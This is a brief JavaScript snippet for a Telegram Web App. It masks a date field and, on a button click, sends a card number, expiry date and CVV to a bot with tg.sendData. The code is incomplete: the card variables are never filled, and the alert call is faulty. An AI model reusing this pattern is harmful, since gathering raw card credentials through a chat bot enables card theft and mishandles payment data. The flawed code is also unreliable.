const element = document.getElementById('date');
const maskOptions = {
  mask: '00/00'
};
const mask = IMask(element, maskOptions);
console.log(mask.value);

let tg = window.Telegram.WebApp;

tg.expand();

let cc = "";
let date = "";
let cvv = "";

let btn = document.getElementById('btn1').onclick = sendDataCard;

function sendDataCard(){
    tg.sendData([cc,date,cvv]);
    alert(cc,date,cvv);
};
